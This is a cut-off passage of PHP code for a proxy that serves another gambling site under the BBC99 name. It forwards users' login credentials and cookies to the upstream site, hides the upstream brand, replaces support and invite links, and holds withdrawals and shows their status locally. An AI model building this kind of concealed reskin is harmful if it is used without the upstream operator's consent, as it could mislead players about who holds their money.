function demoteUpstream(string $failed): void
{
    $mirrors = upstreamMirrors();
    $n = count($mirrors);
    if ($n < 2) {
        return;
    }
    $i = array_search($failed, $mirrors, true);
    if ($i === false) {
        $i = 0;
    }
    $next = $mirrors[($i + 1) % $n];
    if ($next === $failed) {
        return;
    }
    $payload = json_encode([
        'active' => $next,
        'until'  => time() + UPSTREAM_FAIL_TTL,
        'failed' => $failed,
    ]);
    @file_put_contents(upstreamStateFile(), $payload, LOCK_EX);
}

/**
 * Fetch one path from one specific mirror.
 * Returns [body, contentType, statusCode, headers], or false if it never
 * produced a usable response.
 */
function fetchFromUpstream(string $base, string $path, int $maxAttempts = 2, int $timeout = 0): array|false
{
    $url = $base . $path;
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
    $respHeaders = [];
    $collectHeaders = function ($ch, $line) use (&$respHeaders) {
        $len = strlen($line);
        $t = trim($line);
        if ($t !== '' && strpos($t, 'HTTP/') !== 0) {
            $respHeaders[] = $t;
        }
        return $len;
    };

    $forward = [];
    $add = function (string $name, $value) use (&$forward) {
        if ($value !== null && $value !== '') {
            $forward[$name] = $value;
        }
    };
    $add('Content-Type', $_SERVER['CONTENT_TYPE'] ?? null);
    $add('Authorization', $_SERVER['HTTP_AUTHORIZATION'] ?? ($_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? null));
    $add('Merchant', $_SERVER['HTTP_MERCHANT'] ?? null);
    $add('Device', $_SERVER['HTTP_DEVICE'] ?? null);
    $add('Language', $_SERVER['HTTP_LANGUAGE'] ?? null);
    $add('X-Gateway-Version', $_SERVER['HTTP_X_GATEWAY_VERSION'] ?? null);
    $add('Encryption', $_SERVER['HTTP_ENCRYPTION'] ?? null);
    // The encrypted body is only decodable with its digest and RSA key. The
    // upstream answers "request_body_required" when they are missing, which is
    // what made every /wps/session/login fail even though the client sent a
    // perfectly valid body (Encryption alone is not enough).
    $add('X-Digest', $_SERVER['HTTP_X_DIGEST'] ?? null);
    $add('X-RSA', $_SERVER['HTTP_X_RSA'] ?? null);
    $add('Cookie', $_SERVER['HTTP_COOKIE'] ?? null);

    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
    ];
    foreach ($forward as $name => $value) {
        $headers[] = $name . ': ' . $value;
    }

    // Retry on upstream 5xx / timeout (fixes "internet off" on slow /wps/*)
    $attempts = 0;
    $lastErr = '';
    $lastStatus = 0;
    $lastCt = false;
    $lastBody = false;
    do {
        $ch = curl_init($url);
        $resolve = [];
        $uh = parse_url($base, PHP_URL_HOST);
        if ($uh) {
            $ip = @gethostbyname($uh);
            if ($ip && $ip !== $uh && filter_var($ip, FILTER_VALIDATE_IP)) {
                $resolve[] = "$uh:443:$ip";
                $resolve[] = "$uh:80:$ip";
            }
        }
        $opts = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT        => $timeout > 0 ? $timeout : 6,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_ENCODING       => '',
            CURLOPT_CUSTOMREQUEST  => $method,
            CURLOPT_USERAGENT      => clientUserAgent(),
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_HEADERFUNCTION => $collectHeaders,
            CURLOPT_TCP_KEEPALIVE  => 1,
            CURLOPT_TCP_FASTOPEN   => 1,
            CURLOPT_DNS_CACHE_TIMEOUT => 600,
            CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
            CURLOPT_FORBID_REUSE   => false,
            CURLOPT_FRESH_CONNECT  => false,
        ] + ($resolve ? [CURLOPT_RESOLVE => $resolve] : []) + upstreamHttpVersionOpt();
        $share = upstreamCurlShare();
        if ($share !== null) {
            $opts[CURLOPT_SHARE] = $share;
        }
        if ($method === 'POST' || $method === 'PUT' || $method === 'PATCH' || $method === 'DELETE') {
            $raw = file_get_contents('php://input');
            if ($raw !== '' && $raw !== false) {
                $opts[CURLOPT_POSTFIELDS] = $raw;
            }
        }
        curl_setopt_array($ch, $opts);
        $body   = curl_exec($ch);
        $err    = curl_error($ch);
        $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $ct     = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        $lastBody = $body;
        $lastErr = $err;
        $lastStatus = $status;
        $lastCt = $ct;
        if ($body !== false && !$err && $status < 500 && $status !== 0) {
            return [$body, $ct ?: false, $status, $respHeaders];
        }
        $attempts++;
        // Retry only when the upstream actually answered (a 5xx). Retrying a
        // connect/read timeout doubles how long this request holds a process
        // slot, and on a shared host with a small pool that is the difference
        // between a slow page and a site that stops answering. A stalled
        // upstream is handled by the cached copy and the degraded window.
        if ($body !== false && $err === '' && $attempts < $maxAttempts) {
            usleep(100000 * $attempts); // 0.1s backoff (was 0.4s)
            $respHeaders = []; // reset for retry
            continue;
        }
        break;
    } while ($attempts < $maxAttempts);

    error_log("Proxy upstream error after $attempts tries: $lastErr status:$lastStatus url:$url");
    if ($lastBody === false || $lastErr) {
        return false;
    }
    return [$lastBody, $lastCt ?: false, $lastStatus, $respHeaders];
}

/**
 * Fetch a path from upstream, forwarding the original HTTP method, body and
 * relevant headers, moving on to the next mirror if this one fails.
 * Returns [body, contentType, statusCode, headers], or false if every mirror
 * failed to answer at all.
 */
function fetchUpstream(string $path, int $timeout = 0): array|false
{
    $mirrors = upstreamMirrors();
    if (!$mirrors) {
        return fetchFromUpstream('', $path, 2, $timeout);
    }
    $n = count($mirrors);
    $start = activeUpstream();
    $i = array_search($start, $mirrors, true);
    if ($i === false) {
        $i = 0;
    }
    // With only one mirror, keep the old two attempts per request. With several,
    // one attempt each: retrying a mirror that has already failed just delays
    // reaching the next one, and the failed mirror gets skipped soon anyway.
    $perMirrorAttempts = $n > 1 ? 1 : 2;
    $deadline = microtime(true) + UPSTREAM_FAILOVER_BUDGET;
    $last5xx = null;
    for ($tried = 0; $tried < $n; $tried++) {
        if ($tried > 0 && microtime(true) > $deadline) {
            error_log('Proxy mirror sweep hit the ' . UPSTREAM_FAILOVER_BUDGET . "s budget after $tried of $n mirrors url:$path");
            break;
        }
        $base = $mirrors[($i + $tried) % $n];
        $res = fetchFromUpstream($base, $path, $perMirrorAttempts, $timeout);
        if ($res !== false && $res[2] < 500) {
            return $res; // healthy answer (a 4xx is a real answer, not a failure)
        }
        if ($res !== false) {
            $last5xx = $res; // mirror is reachable but broken
        }
        // Only a mirror that could not answer at all is worth demoting. A 5xx is
        // usually a momentary upstream hiccup, and skipping the primary for two
        // minutes because of one would be worse than just retrying it next time -
        // the sweep already covers the request in hand either way.
        if ($res === false) {
            demoteUpstream($base);
        }
    }
    // Nothing worked. Keep a 5xx response if we got one, so the caller's
    // serveStale()/status handling behaves exactly as it did with one upstream.
    return $last5xx ?? false;
}

/**
 * Rewrite absolute upstream paths in HTML to local cache paths
 * and download the referenced resources.
 */
function rewriteAndCache(string $html): string
{
    // When CACHE_TTL=0 caching is disabled — skip download and keep CDN URLs
    if (CACHE_TTL === 0) return $html;
    $doCache = CACHE_TTL > 0;
    // Pattern 1: Quoted attributes — src="/res/...", href='/res/...'
    $quotedPattern = '/((?:src|href|content|poster|data-src|action)\s*=\s*)("|\')((?:https?:\/\/[^\/]+)?\/res\/[^"\'\s>]+)\2/i';

    $html = preg_replace_callback($quotedPattern, function ($m) use ($doCache) {
        $attr   = $m[1];
        $quote  = $m[2];
        $rawUrl = $m[3];
        $relPath = preg_replace('#^https?://[^/]+#', '', $rawUrl);
        // Deliberately no cacheResource() here: this callback runs once per
        // matching URL in the HTML and every call was a blocking upstream
        // fetch, so the first page view waited on dozens of them. Assets are
        // cached lazily instead, when the browser actually requests them.
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return $attr . $quote . $cleanPath . $quote;
    }, $html);

    // Pattern 2: Unquoted attributes — href=/res/...
    $unquotedPattern = '/((?:src|href|content|poster|data-src|action)\s*=\s*)((?:https?:\/\/[^\/]+)?\/res\/[^\s>"\']+)/i';

    $html = preg_replace_callback($unquotedPattern, function ($m) use ($doCache) {
        $attr   = $m[1];
        $rawUrl = $m[2];
        $relPath = preg_replace('#^https?://[^/]+#', '', $rawUrl);
        // Deliberately no cacheResource() here: this callback runs once per
        // matching URL in the HTML and every call was a blocking upstream
        // fetch, so the first page view waited on dozens of them. Assets are
        // cached lazily instead, when the browser actually requests them.
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return $attr . $cleanPath;
    }, $html);

    // Also rewrite inline CSS url() references (e.g. background-image: url(/res/...))
    $html = preg_replace_callback('/url\(\s*["\']?((?:https?:\/\/[^\/]+)?\/res\/[^"\'\)]+)\)["\']?\s*/i', function ($m) use ($doCache) {
        $relPath = preg_replace('#^https?://[^/]+#', '', $m[1]);
        // Deliberately no cacheResource() here: this callback runs once per
        // matching URL in the HTML and every call was a blocking upstream
        // fetch, so the first page view waited on dozens of them. Assets are
        // cached lazily instead, when the browser actually requests them.
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return 'url(' . $cleanPath . ')';
    }, $html);

    return $html;
}

/**
 * Replace the brand name in display text only. Domains, CDNs and auth
 * config are left untouched so logins and domain routing keep working.
 */
function applyBrand(string $body, string $contentType): string
{
    if ($body === '') {
        return $body;
    }
    if (stripos($contentType, 'json') !== false) {
        $decoded = json_decode($body, true);
        if (is_array($decoded)) {
            if ($decoded === []) {
                return $body; // keep empty objects/arrays untouched
            }
            $decoded = brandWalk($decoded);
            $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            return $encoded === false ? $body : $encoded;
        }
        // Not valid JSON — treat as plain text (some cached files are mislabelled)
        return brandReplaceText($body);
    }
    // All other text-based content (HTML, JS, CSS, SVG, XML)
    return brandReplaceText($body);
}

/**
 * Replace brand text anywhere except inside URLs / domain names.
 * Skips: https://...1333bet..., www.1333bet.com, 1333bet.ai, bd-1333bet.
 * Also covers lotto white-label leftovers (lottogamez / lotto) -> BBC99.
 */
function brandReplaceText(string $text): string
{
    if (BRAND_TO === '') {
        return $text;
    }
    // Upstream spells its brand several ways (1333bk, 1333bet, BigAceWin, lotto).
    // Replace every variant so none leaks into titles, text or attributes.
    // URL/domain guards stay: https://...1333bet..., 1333bet.ai etc. are kept.
    // Longest first so 'lottogamez' wins over generic 'lotto'.
    $variants = array_unique(array_filter([BRAND_FROM, 'lottogamez', '1333bk', '1333bet', 'BigAceWin', 'lotto']));
    foreach ($variants as $from) {
        if ($from === '' || stripos($text, $from) === false) continue;
        if (strcasecmp($from, BRAND_TO) === 0) continue;
        $pattern = '/(?<![\w.\/-])' . preg_quote($from, '/') . '(?!\.[a-z])/i';
        $text = preg_replace($pattern, BRAND_TO, $text);
    }
    return $text;
}

/**
 * Remove console.* calls from JS/HTML to keep browser console clean.
 * Does NOT clear console, just removes upstream log/warn/error writes.
 */
function stripConsoleWrites(string $body, string $contentType): string
{
    if ($body === '' || stripos($body, 'console.') === false) {
        return $body;
    }
    $isJs = stripos($contentType, 'javascript') !== false || stripos($contentType, 'application/javascript') !== false;
    $isHtml = stripos($contentType, 'text/html') !== false;
    if (!$isJs && !$isHtml) {
        return $body;
    }
    // Only strip the noisy upstream brand log, keep other console.* for debugging
    $body = str_ireplace('console.log("brand",brand)', '', $body);
    $body = str_ireplace("console.log('brand',brand)", '', $body);
    return $body === null ? $body : $body;
}

/**
 * Recursively rewrite brand text in JSON values, skipping protected keys.
 */
function brandWalk($data)
{
    if (is_array($data)) {
        foreach ($data as $key => $value) {
            if (is_string($key) && in_array($key, BRAND_SKIP_KEYS, true)) {
                continue;
            }
            $data[$key] = brandWalk($value);
        }
        return $data;
    }
    if (is_string($data)) {
        return brandReplaceText($data);
    }
    return $data;
}

/**
 * Rewrite invite/share domains that the upstream JSON accidentally leaves as
 * the upstream brand (e.g. 133bet22.com, 1333bk.com, lotto domains) so
 * /m/inviteFriends shows the current host (bbc99.bet) instead.
 */
function applyInviteDomain(string $body, string $contentType): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (stripos($body, '133bet22') === false && stripos($body, '1333bet') === false && stripos($body, '1333bk') === false && stripos($body, 'bbc9922') === false && stripos($body, 'lotto') === false && stripos($body, 'gamer.free') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || $decoded === []) {
        // not JSON object/array — plain text JSON: direct string replace
        $host = strtolower(preg_replace('/:\d+$/', '', (string) ($_SERVER['HTTP_HOST'] ?? 'www.bbc99.bet')));
        return inviteTextReplace($body, $host);
    }
    $host = strtolower(preg_replace('/:\d+$/', '', (string) ($_SERVER['HTTP_HOST'] ?? 'www.bbc99.bet')));
    if ($host === '') {
        return $body;
    }
    $decoded = inviteWalk($decoded, $host);
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

function inviteTextReplace(string $text, string $host): string
{
    // full URLs first, then bare domains
    $text = preg_replace('/https?:\/\/(?:www\.)?133bet22\.com/i', 'https://' . $host, $text);
    $text = preg_replace('/\/\/133bet22\.com/i', '//' . $host, $text);
    $text = preg_replace('/\b(?:www\.)?133bet22\.com\b/i', $host, $text);
    $text = preg_replace('/https?:\/\/(?:www\.)?1333bet\.ai/i', 'https://' . $host, $text);
    $text = preg_replace('/\/\/1333bet\.ai/i', '//' . $host, $text);
    $text = preg_replace('/\b(?:www\.)?1333bet\.ai\b/i', $host, $text);
    // Current upstream mirror family (1333bk.com + numeric variants).
    $text = preg_replace('/https?:\/\/(?:www\.)?1333bk\.com/i', 'https://' . $host, $text);
    $text = preg_replace('/\/\/1333bk\.com/i', '//' . $host, $text);
    $text = preg_replace('/\b(?:www\.)?1333bk\.com\b/i', $host, $text);
    $text = preg_replace('/https?:\/\/(?:www\.)?1333bet\d+\.com/i', 'https://' . $host, $text);
    $text = preg_replace('/\b(?:www\.)?1333bet\d+\.com\b/i', $host, $text);
    // Agency/white-label domain variant (e.g. referral ?r= links built as
    // bbc9922.com): same treatment, preserving the original scheme.
    $text = preg_replace('/(https?):\/\/(?:www\.)?bbc9922\.com/i', '$1://' . $host, $text);
    $text = preg_replace('/\/\/bbc9922\.com/i', '//' . $host, $text);
    $text = preg_replace('/\b(?:www\.)?bbc9922\.com\b/i', $host, $text);
    // Lotto white-label leftovers (lottogamez.gamer.free, lotto domains).
    $text = preg_replace('/https?:\/\/[a-z0-9-]*lotto[a-z0-9-]*\.[a-z0-9.\-]+/i', 'https://' . $host, $text);
    $text = preg_replace('/\b[a-z0-9-]*lotto[a-z0-9-]*\.[a-z0-9.\-]+\b/i', $host, $text);
    // Upstream affiliate infra (*.gamer.free) -> current host for share links.
    $text = preg_replace('/https?:\/\/[a-z0-9-]+\.gamer\.free/i', 'https://' . $host, $text);
    $text = preg_replace('/\b[a-z0-9-]+\.gamer\.free\b/i', $host, $text);
    // plain "133bet22" bare token without TLD (rare) — only when looks like domain/short host
    // Do not touch generic "133bet" brand text — brandReplaceText handles that separately
    return $text;
}

function inviteWalk($data, string $host)
{
    if (is_array($data)) {
        foreach ($data as $k => $v) {
            $data[$k] = inviteWalk($v, $host);
        }
        return $data;
    }
    if (is_string($data)) {
        return inviteTextReplace($data, $host);
    }
    return $data;
}

/**
 * Local web-app icon (/img/web_app_icon.png). Used for PWA manifest,
 * AppDownloadIcon and desktop_app_logo so install prompts never show 1333.
 */
function webAppIconUrl(): string
{
    $file = dirname(__DIR__) . '/img/web_app_icon.png';
    if (is_file($file)) {
        return '/img/web_app_icon.png?v=' . filemtime($file);
    }
    return '/img/web_app_icon.png';
}

/**
 * Replace the upstream app-download icon
 * (https://images.3820949.com/.../merchant_resource/appdownloadicon/app_download_icon_ckb2bdts2_20260329212117.png
 * and any sibling merchant appdownloadicon URL) with the local web app icon.
 * Runs on text content (HTML/JSON/JS/CSS) both live and from cache.
 */
function applyAppIconUrl(string $body, string $contentType): string
{
    if ($body === '') {
        return $body;
    }
    $ct = strtolower($contentType);
    $isText = stripos($ct, 'html') !== false || stripos($ct, 'json') !== false
        || stripos($ct, 'javascript') !== false || stripos($ct, 'css') !== false
        || stripos($ct, 'text/') === 0 || $ct === '';
    if (!$isText) {
        return $body;
    }
    if (stripos($body, 'appdownloadicon') === false && stripos($body, 'desktop_app_logo') === false) {
        return $body;
    }
    $appIcon = webAppIconUrl();
    $body = str_ireplace('https://images.3820949.com/wsd-images-prod/ckb2bdts2/merchant_resource/appdownloadicon/app_download_icon_ckb2bdts2_20260329212117.png', $appIcon, $body);
    $body = preg_replace('#https?://[^"\'()\s]*/merchant_resource/appdownloadicon/[^"\'()\s]+#i', $appIcon, $body);
    $body = preg_replace('#https?://[^"\'()\s]*/fe_setting/(?:desktop_app_logo|appdownloadicon)/[^"\'()\s]+#i', $appIcon, $body);
    return $body;
}

/**
 * Replace customer-service / live-chat links with support.bbc99.bet.
 * JSON is handled key-by-key inside contentWalk; this covers HTML/JS/CSS/text.
 */
function applySupportUrl(string $body, string $contentType): string
{
    if ($body === '') {
        return $body;
    }
    $ct = strtolower($contentType);
    if (stripos($ct, 'json') !== false) {
        return $body;
    }
    $isText = stripos($ct, 'html') !== false || stripos($ct, 'javascript') !== false
        || stripos($ct, 'css') !== false || stripos($ct, 'text/') === 0 || $ct === '';
    if (!$isText) {
        return $body;
    }
    return support_url_replace($body);
}

/**
 * Override app name / titles inside JSON responses (manifest + app title keys).
 * Also forces PWA manifest icons + AppDownloadIcon to the local web app icon.
 */
function applyContentJson(string $body, string $contentType, string $path, array $content): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    $titles = $content['titles'] ?? [];
    $map = [];
    if (($titles['web_title'] ?? '') !== '') {
        $map['desktop_app_title'] = $titles['web_title'];
        $map['web_app_title'] = $titles['web_title'];
    }
    if (($titles['mobile_title'] ?? '') !== '') {
        $map['mobile_app_title'] = $titles['mobile_title'];
    }
    if (($titles['app_name'] ?? '') !== '') {
        $map['appName'] = $titles['app_name'];
    }
    // Rewrite the upstream logo / favicon URLs before serving, so the browser
    // receives the custom image URL directly (no client-side swap needed).
    $logo = $content['logo'] ?? [];
    if (trim((string) ($logo['url'] ?? '')) !== '') {
        $map['web_logo'] = $logo['url'];
        $map['h5_logo'] = $logo['url'];
    }
    $favicon = $content['favicon'] ?? [];
    if (trim((string) ($favicon['url'] ?? '')) !== '') {
        $map['favicon'] = $favicon['url'];
        $map['apple_touch_icon'] = $favicon['url'];
    }
    $appName = (string) ($titles['app_name'] ?? '');
    $isManifest = (bool) preg_match('#manifest\.json$#i', $path);
    $appIcon = webAppIconUrl();
    if (!$map && !$isManifest && $appIcon === '') {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || $decoded === []) {
        return $body;
    }
    $decoded = contentWalk($decoded, $map, $isManifest, $appName, $appIcon);
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

function contentWalk($data, array $map, bool $isManifest, string $appName, string $appIcon = '')
{
    if (!is_array($data)) {
        // Any upstream APP-ICON URL leaking into a string value -> local app icon.
        // Narrow to icon paths only (bank/splash images share the same CDN host).
        if (is_string($data) && $appIcon !== '' && preg_match('#^https?://[^"\']*(?:merchant_resource/appdownloadicon|fe_setting/(?:desktop_app_logo|appdownloadicon))[^"\']*$#i', $data)) {
            return $appIcon;
        }
        return $data;
    }
    // PWA manifest icons[] -> all point at the local web app icon.
    if ($isManifest && $appIcon !== '' && isset($data['icons']) && is_array($data['icons'])) {
        foreach ($data['icons'] as $ii => $ic) {
            if (is_array($ic)) {
                $data['icons'][$ii]['src'] = $appIcon;
            }
        }
    }
    foreach ($data as $k => $v) {
        if (is_string($k) && is_string($v)) {
            if (isset($map[$k])) {
                $data[$k] = $map[$k];
                continue;
            }
            // Support / live-chat links -> support.bbc99.bet.
            if (in_array(strtolower($k), support_url_keys(), true)) {
                if (preg_match('#^https?://#i', $v)) {
                    $data[$k] = SUPPORT_URL;
                    continue;
                }
            }
            if (is_support_url($v)) {
                $data[$k] = SUPPORT_URL;
                continue;
            }
            if ($isManifest && $appName !== '' && ($k === 'name' || $k === 'short_name')) {
                $data[$k] = $appName;
                continue;
            }
            // App download / desktop icon keys -> local web app icon.
            if ($appIcon !== '') {
                $kl = strtolower($k);
                if ($kl === 'appdownloadicon' || $kl === 'app_download_icon' || $kl === 'desktop_app_logo' || $kl === 'desktopapplogo' || $kl === 'app_logo' || $kl === 'applogo' || strpos($kl, 'appdownloadicon') !== false || strpos($kl, 'app_download_icon') !== false) {
                    $data[$k] = $appIcon;
                    continue;
                }
                // Value is an upstream app-icon URL -> local app icon.
                if (preg_match('#^https?://[^"\']*(?:merchant_resource/appdownloadicon|fe_setting/(?:desktop_app_logo|appdownloadicon))[^"\']*$#i', $v)) {
                    $data[$k] = $appIcon;
                    continue;
                }
            }
        }
        $data[$k] = contentWalk($v, $map, $isManifest, $appName, $appIcon);
    }
    return $data;
}

/**
 * Replace the `value.banners` list that feeds the site's own game-banner
 * carousel (the w_home group) with the admin-managed banner images/links.
 */
function applyBannersJson(string $body, string $contentType, string $path, array $content): string
{
    $list = [];
    foreach ($content['banners'] ?? [] as $b) {
        if (!is_array($b) || empty($b['active']) || trim((string) ($b['image'] ?? '')) === '') {
            continue;
        }
        $list[] = [
            'image' => trim((string) $b['image']),
            'link'  => trim((string) ($b['link'] ?? '')),
            'title' => trim((string) ($b['title'] ?? '')),
        ];
    }
    if (!$list) {
        return $body;
    }
    if (stripos($contentType, 'json') === false || stripos($path, 'getListAnnouncements') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    $base = (!empty($decoded['value']['banners']) && is_array($decoded['value']['banners']))
        ? $decoded['value']['banners'][0]
        : [];
    $base = is_array($base) ? $base : [];
    $baseId = (int) ($base['bannerId'] ?? 1000);
    $group = (string) ($base['groupName'] ?? 'w_home');
    if ($group === '') {
        $group = 'w_home';
    }
    $out = [];
    foreach ($list as $i => $b) {
        $item = $base;
        $item['bannerId'] = $baseId + $i;
        $item['groupName'] = $group;
        $item['url'] = $b['image'];
        $item['title'] = $b['title'];
        $item['linkage'] = '';
        $item['redirectPromotionId'] = null;
        $item['gameLinkageMapping'] = null;
        if ($b['link'] !== '') {
            $item['redirect'] = 'REDIRECT_URL';
            $item['externalLink'] = $b['link'];
            $item['linkageType'] = 'URL';
        } else {
            $item['redirect'] = null;
            $item['externalLink'] = '';
            $item['linkageType'] = '';
        }
        $out[] = $item;
    }
    $decoded['value']['banners'] = $out;
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Replace the announcements list that feeds the site's marquee bar
 * (notice_main > marquee_box) with the admin-managed marquee text.
 */
function applyMarqueeJson(string $body, string $contentType, string $path, array $content): string
{
    $m = $content['marquee'] ?? [];
    if (empty($m['enabled'])) {
        return $body;
    }
    // Collect messages: prefer the items list, fall back to the legacy single text.
    $msgs = [];
    if (!empty($m['items']) && is_array($m['items'])) {
        foreach ($m['items'] as $it) {
            $t = trim((string) ($it['text'] ?? ''));
            if ($t !== '') {
                $msgs[] = ['text' => $t, 'link' => trim((string) ($it['link'] ?? ''))];
            }
        }
    }
    if (!$msgs && trim((string) ($m['text'] ?? '')) !== '') {
        $msgs[] = ['text' => trim((string) $m['text']), 'link' => trim((string) ($m['link'] ?? ''))];
    }
    if (!$msgs) {
        return $body;
    }
    if (stripos($contentType, 'json') === false || stripos($path, 'getListAnnouncements') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    $base = (!empty($decoded['value']['player']) && is_array($decoded['value']['player']))
        ? $decoded['value']['player'][0]
        : [];
    $base = is_array($base) ? $base : [];
    $baseId = (int) ($base['id'] ?? 100000);
    $out = [];
    foreach ($msgs as $i => $msg) {
        $item = $base;
        $item['id'] = $baseId + $i;
        $item['title'] = $msg['text'];
        if (array_key_exists('content', $item)) {
            $item['content'] = '';
        }
        if ($msg['link'] !== '') {
            $item['externalLink'] = $msg['link'];
        }
        $item['announcementDisplaySpeed'] = 'HIGH';
        $out[] = $item;
    }
    $decoded['value']['player'] = $out;
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Drop native-app download entries (APK/IPA/Android resources) from JSON responses
 * so no APK download link is ever exposed to the client.
 */
function applyApkPolicy(string $body, string $contentType): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (stripos($body, 'resourceType') === false && stripos($body, '.apk') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || $decoded === []) {
        return $body;
    }
    $decoded = apkWalk($decoded);
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Recursively remove Android/APK app-download entries from decoded JSON.
 */
function apkWalk($data)
{
    if (!is_array($data)) {
        return $data;
    }
    $isList = $data === [] || array_keys($data) === range(0, count($data) - 1);
    $out = [];
    foreach ($data as $k => $v) {
        if (is_array($v)) {
            $rt = isset($v['resourceType']) ? (string) $v['resourceType'] : '';
            $url = isset($v['url']) ? (string) $v['url'] : '';
            if (($rt !== '' && preg_match('/android|apk/i', $rt))
                || preg_match('/\.(apk|ipa)(\?|#|$)/i', $url)) {
                continue; // drop native-app download resource
            }
        }
        if (is_string($k) && strtolower($k) === 'android' && is_string($v) && preg_match('/\.apk/i', $v)) {
            continue;
        }
        $out[$k] = apkWalk($v);
    }
    return $isList ? array_values($out) : $out;
}

/**
 * Enforce registration field rules by rewriting the site's server-driven
 * validation config (GET /wps/system/setting/register). The site's own form
 * validator then rejects bad input and blocks the submit.
 *  - mobileNum: valid BD mobile (013-019, 11 digits)
 *  - username : must start with a letter, letters/numbers, never all-numeric
 */
function applyRegisterRules(string $body, string $contentType, string $path): string
{
    $mobile = REG_MOBILE_PATTERN;
    $user   = REG_USERNAME_PATTERN;
    if ($mobile === '' && $user === '') {
        return $body;
    }
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (!preg_match('#^/wps/system/setting/register/?$#i', (string) $path)) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    if ($mobile !== '' && isset($decoded['value']['mobileNum']) && is_array($decoded['value']['mobileNum'])) {
        $decoded['value']['mobileNum']['acceptedPattern'] = $mobile;
        $decoded['value']['mobileNum']['minLength'] = 11;
        $decoded['value']['mobileNum']['maxLength'] = 11;
        $decoded['value']['mobileNum']['patternId'] = 6; // "only numbers allowed"
    }
    if ($user !== '' && isset($decoded['value']['username']) && is_array($decoded['value']['username'])) {
        $decoded['value']['username']['acceptedPattern'] = $user;
        // min/max length are left as configured by upstream.
        $decoded['value']['username']['patternId'] = 1; // "first character must be a letter..."
    }
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Optimistic withdraw balance: subtract this visitor's active holds
 * (Pending + un-consumed Approved) from GET /wps/v2/wallets/balance so
 * header, mall, and /m/withdraw all show balance - withdraw amount.
 * Consumed / Rejected / Expired holds are excluded, so approval+retry
 * (upstream really debited) never double-subtracts and reject restores.
 */
function applyWithdrawBalance(string $body, string $contentType, string $path): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (stripos($path, '/wps/v2/wallets/balance') === false) {
        return $body;
    }
    $sessionKey = requestSessionKey();
    if ($sessionKey === '') {
        return $body;
    }
    require_once __DIR__ . '/admin/store.php';
    $hold = withdraw_active_hold_sum($sessionKey);
    if ($hold <= 0) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    $val = &$decoded['value'];
    if (isset($val['sumBalance']) && is_numeric($val['sumBalance'])) {
        $val['sumBalance'] = round(max(0.0, (float) $val['sumBalance'] - $hold), 2);
    }
    if (isset($val['balance']) && is_array($val['balance'])) {
        $isList = $val['balance'] === [] || array_keys($val['balance']) === range(0, count($val['balance']) - 1);
        if ($isList) {
            $idx = null;
            foreach ($val['balance'] as $i => $b) {
                if (is_array($b) && (int) ($b['accountTypeId'] ?? 0) === 2) {
                    $idx = $i;
                    break;
                }
            }
            if ($idx === null && isset($val['balance'][0]) && is_array($val['balance'][0])) {
                $idx = 0;
            }
            if ($idx !== null && isset($val['balance'][$idx]['availBalance'])
                && is_numeric($val['balance'][$idx]['availBalance'])) {
                $val['balance'][$idx]['availBalance'] = round(
                    max(0.0, (float) $val['balance'][$idx]['availBalance'] - $hold), 2);
            }
        } elseif (isset($val['balance']['availBalance']) && is_numeric($val['balance']['availBalance'])) {
            $val['balance']['availBalance'] = round(max(0.0, (float) $val['balance']['availBalance'] - $hold), 2);
        }
    }
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Merge local withdraw approvals into the upstream withdraw report so
 * /m/withdrawReport shows Pending / Approved / Rejected status for this
 * visitor. Defensive: clones the first upstream row as a template so the
